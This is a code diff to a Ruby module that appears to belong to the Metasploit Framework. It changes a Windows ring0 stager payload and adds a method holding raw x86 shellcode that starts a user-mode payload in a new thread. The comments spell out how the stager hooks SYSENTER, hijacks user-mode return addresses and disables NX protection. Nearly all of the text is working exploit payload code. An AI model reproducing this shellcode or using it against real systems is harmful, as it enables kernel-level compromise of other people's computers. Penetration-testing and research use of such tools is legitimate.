@@ -20,7 +20,7 @@ module Stager
 	# This payload works as follows:
 	# * Our sysenter handler and ring3 stagers are copied over to safe location.
 	# * The SYSENTER_EIP_MSR is patched to point to our sysenter handler.
-	# * The srv2.sys thread we are in is placed in a halted state.
+	# * The ring0 thread we are in is placed in a halted state.
 	# * Upon any ring3 proces issuing a sysenter command our ring0 sysenter handler gets control.
 	# * The ring3 return address is modified to force our ring3 stub to be called if certain conditions met.
 	# * If NX is enabled we patch the respective page table entry to disable it for the ring3 code.
@@ -61,7 +61,9 @@ module Stager
 				"\xE9\x09\x00\x00\x00\xB9\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3"
 		
 		# The ring3 payload.
-		r3 = opts['UserModeStub'] || ''
+		r3  = ''
+		r3 += _createthread() if opts['CreateThread'] == true
+		r3 += opts['UserModeStub'] || ''
 		
 		# Patch in the required values.
 		r0 = r0.gsub( [ 0x41414141 ].pack("V"), [ ( r0.length + r3.length - 0x1C ) ].pack("V") )
@@ -117,7 +119,28 @@ module Stager
 	end
 
 protected
-
+	
+	# 
+	# Stub to run a prepended ring3 payload in a new thread.
+	# 
+	# Full assembly source at:
+	# /msf3/external/source/shellcode/windows/x86/src/single/createthread.asm
+	#
+	def self._createthread
+		r3 =    "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+				"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+				"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+				"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+				"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+				"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+				"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+				"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+				"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+				"\x31\xC0\x50\x50\x50\x8D\x9D\xA0\x00\x00\x00\x53\x50\x50\x68\x38" +
+				"\x68\x0D\x16\xFF\xD5\xC3\x58"
+		return r3
+	end
+	
 	#
 	# This stub is used by stagers to check to see if the code is
 	# running in the context of a user-mode system process.  By default,
